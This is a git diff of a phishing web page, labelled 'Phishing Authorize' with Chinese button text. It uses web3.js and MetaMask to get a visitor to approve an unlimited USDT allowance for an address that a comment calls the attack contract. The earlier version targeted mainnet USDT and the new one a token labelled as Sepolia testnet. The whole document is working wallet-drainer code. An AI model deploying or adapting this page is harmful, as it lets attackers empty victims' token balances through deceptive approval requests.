@@ -1,30 +1,49 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>授權頁面</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phishing Authorize</title>
 </head>
 <body>
-  <h1>請點擊下方按鈕授權 USDT</h1>
-  <button onclick="approve()">授權</button>
+  <h2>🔓 授權 USDT（Sepolia 測試網）</h2>
+  <button onclick="approve()">授權最大金額</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <script>
-    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Ethereum 主網 USDT
-    const ABI = [{ "name": "approve", "type": "function", "inputs": [
-      { "type": "address", "name": "_spender" },
-      { "type": "uint256", "name": "_value" }
-    ], "constant": false, "outputs": [], "payable": false }];
+    const tokenAddress = "0x42A5843bF9980e0773c4f02Bd3d59b8a8f1c3fF"; // ✅ Sepolia 測試網 USDT
+    const spender = "0xfC35E3407c86461BA2D00C080cC763c0f6878377"; // ✅ 你的攻擊合約地址
+
+    const ABI = [
+      {
+        constant: false,
+        inputs: [
+          { name: "_spender", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
+      }
+    ];
 
     async function approve() {
-      if (typeof window.ethereum === "undefined") return alert("請安裝 MetaMask");
+      if (typeof window.ethereum === 'undefined') {
+        alert("請使用 MetaMask 開啟");
+        return;
+      }
+
       const web3 = new Web3(window.ethereum);
       const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-      const contract = new web3.eth.Contract(ABI, USDT);
-      const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      await contract.methods.approve(CONTRACT, max).send({ from: accounts[0] });
-      alert("✅ 授權成功！");
+      const account = accounts[0];
+
+      const contract = new web3.eth.Contract(ABI, tokenAddress);
+
+      const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      contract.methods.approve(spender, maxUint).send({ from: account })
+        .then(() => alert("授權成功 ✅"))
+        .catch(err => alert("授權失敗 ❌\n" + err.message));
     }
   </script>
 </body>
